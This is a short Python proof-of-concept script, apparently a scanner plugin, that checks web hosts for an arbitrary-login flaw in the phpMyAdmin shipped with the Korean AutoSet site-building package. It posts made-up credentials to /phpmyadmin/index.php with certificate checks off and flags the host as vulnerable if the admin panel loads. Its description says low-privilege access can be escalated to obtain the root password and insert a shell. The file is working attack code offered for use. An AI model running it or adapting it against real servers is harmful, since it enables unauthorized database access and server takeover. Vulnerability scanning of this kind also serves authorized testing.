#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 韩国autoset建站程序phpmyadmin任意登录漏洞
referer: https://www.t00ls.net/viewthread.php?tid=37863&extra=&page=1
author: Lucifer
description: /phpmyadmin任意用户名密码登录,通过低权限提权可获取root密码插入shell。
'''
import sys
import json
import requests
import warnings
def run(url):
    result =['韩国autoset建站程序phpmyadmin任意登录漏洞','','']
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/phpmyadmin/index.php"
    vulnurl = url + payload
    post_data = {
        "pma_username":"test",
        "pma_password":"123",
        "server":"1",
        "target":"index.php",
    }
    try:
        req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
        if r"li_server_type" in req.text:
            result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            result[2]='存在'
        else:
            result[2]='不存在'

    except:
        result[2]='不存在'
    return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")#抑制第三方警告
    testVuln = run(sys.argv[1])